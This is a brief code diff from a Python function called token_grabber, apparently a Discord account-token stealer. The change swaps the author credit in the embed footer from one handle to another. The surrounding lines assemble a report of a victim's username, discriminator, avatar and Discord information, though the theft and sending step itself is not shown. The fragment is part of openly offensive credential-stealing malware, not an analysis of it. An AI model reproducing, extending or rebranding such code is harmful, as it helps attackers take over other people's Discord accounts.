@@ -56,7 +56,7 @@ def token_grabber():
 
         embed = DiscordEmbed()
         embed.set_thumbnail(url=avatar_url)
-        embed.set_footer(text='Made by checksum (@computergoon)', icon_url='https://media.discordapp.net/attachments/753892365214679131/763117465034424350/tumblr_pt0s6axt6d1tjw0rpo1_400.gif')
+        embed.set_footer(text='Made by checksum (@0xFADE)', icon_url='https://media.discordapp.net/attachments/753892365214679131/763117465034424350/tumblr_pt0s6axt6d1tjw0rpo1_400.gif')
         embed.set_title(f'__{user.username}#{user.discriminator}__')
         embed.description = f'''
 **Discord Information**
